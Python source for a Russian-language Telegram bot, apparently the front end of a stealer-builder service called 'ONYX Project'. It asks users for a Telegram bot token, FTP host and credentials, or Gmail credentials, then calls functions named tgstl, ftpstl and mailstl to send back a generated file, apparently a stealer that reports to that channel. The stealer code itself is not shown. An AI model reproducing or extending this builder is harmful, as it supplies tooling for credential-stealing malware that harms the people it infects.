@bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
    keyboard = types.InlineKeyboardMarkup()
    tgbot = types.InlineKeyboardButton(text='🖥Telegram Bot', callback_data="tgbot")
    ftp = types.InlineKeyboardButton(text='📡FTP', callback_data="ftp")
    mail = types.InlineKeyboardButton(text='✉️Gmail.com', callback_data="mail")
    info = types.InlineKeyboardButton(text='ℹ️Информация', callback_data="info")

    keyboard.add(tgbot)
    keyboard.add(ftp)
    keyboard.add(mail)
    keyboard.add(info)

    message = call.message

    if call.message:
        chat_id = int(message.chat.id)
        text = message.text
        if 'РАЗОСЛАТЬ: ' in text and str(chat_id) in ADMIN_CHAT_ID:
            msg = text.replace("РАЗОСЛАТЬ: ", "")
            send_message_users(msg)
            bot.send_message(chat_id, '✅Успешно')

        if call.data == "tgbot":
            def tknuser(message):
                msg = bot.send_message(message.chat.id, "📝Введите токен вашего бота:")
                bot.register_next_step_handler(msg, file)

            def file(message):
                tkn = message.text
                idtg = message.chat.id
                bot.send_message(message.chat.id, "⏳Подождите.... В скором времени бот отправит ваш файл!")
                tgstl(tkn, idtg, message)

            tknuser(message)

        elif call.data == "ftp":
            def ques(message):
                msg = bot.send_message(message.chat.id, "📝Введите логин ftp аккаунта:")
                bot.register_next_step_handler(msg, logq)

            def logq(message):
                chat_id = message.chat.id
                log = message.text
                user = User(log)
                user_dict[chat_id] = user
                msg = bot.reply_to(message, '📝Введите пароль ftp аккаунта:')
                bot.register_next_step_handler(msg, pasq)

            def pasq(message):
                chat_id = message.chat.id
                pas = message.text
                user = user_dict[chat_id]
                user.pas = pas
                msg = bot.reply_to(message, '📝Введите хост ftp:')
                bot.register_next_step_handler(msg, hostq)

            def hostq(message):
                chat_id = message.chat.id
                host = message.text
                user = user_dict[chat_id]
                bot.send_message(message.chat.id, "⏳Подождите.... В скором времени бот отправит ваш файл!")
                thread1 = Thread(target=ftpstl, args=(host, message), daemon=True)
                thread1.start()

            ques(message)

        elif call.data == "mail":
            def ques(message):
                markup = types.InlineKeyboardMarkup()
                btn_my_site = types.InlineKeyboardButton(text='Тут обязательно включить!',
                                                         url='https://myaccount.google.com/u/1/lesssecureapps?pageId=none')
                markup.add(btn_my_site)
                msg = bot.send_message(message.chat.id,
                                       "📝Введите <b>логин</b> gmail <b>отправителя</b>(Пример: example@gmail.com):",
                                       parse_mode="HTML", reply_markup=markup)
                bot.register_next_step_handler(msg, logq)

            def logq(message):
                chat_id = message.chat.id
                log = message.text
                user = UserMail(log)
                user_data[chat_id] = user
                msg = bot.reply_to(message, '📝Введите <b>пароль</b> gmail аккаунта <b>отправителя</b>:',
                                   parse_mode="HTML")
                bot.register_next_step_handler(msg, pasq)

            def pasq(message):
                chat_id = message.chat.id
                pas = message.text
                user = user_data[chat_id]
                user.pas = pas
                msg = bot.reply_to(message,
                                   '📝Введите <b>логин</b> gmail <b>получателя</b>(Пример: example@gmail.com):',
                                   parse_mode="HTML")
                bot.register_next_step_handler(msg, mailq)

            def mailq(message):
                chat_id = message.chat.id
                mail = message.text
                user = user_data[chat_id]
                bot.send_message(message.chat.id, "⏳Подождите.... В скором времени бот отправит ваш файл!")
                thread2 = Thread(target=mailstl, args=(mail, message),daemon=True)
                thread2.start()

            ques(message)

        elif call.data == "info":
            bot.send_message(message.chat.id,
                             "🖖Приветствую тебя! \n Это бот канала <b>ONYX Project</b>: @onyx_project\n\nПо вопросам и т.п: @fleeen",
                             parse_mode="HTML")

    else:
        bot.send_message(message.chat.id, "Я тебя не понял! Давай по новой всё хуйня")


def send_message_users(message):
    def send_message(chat_id):
        data = {
            'chat_id': chat_id,
            'text': message
        }
        response = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', data=data)

    with open(vip_id_file, "r") as vip_file:
        vip_list = [line.split('\n')[0] for line in vip_file]

    [send_message(chat_id) for chat_id in vip_list]


@bot.message_handler(content_types=['text'])
def handle_message_received(message):
    chat_id = int(message.chat.id)
    text = message.text
    if 'РАЗОСЛАТЬ: ' in text and str(chat_id) in open('adm.txt').read():
        msg = text.replace("РАЗОСЛАТЬ: ", "")
        send_message_users(msg)
        bot.send_message(chat_id, '✅Успешно')
    else:
        bot.send_message(chat_id, 'Я тебя не понял! Давай по новой всё хуйня')


bot.polling()
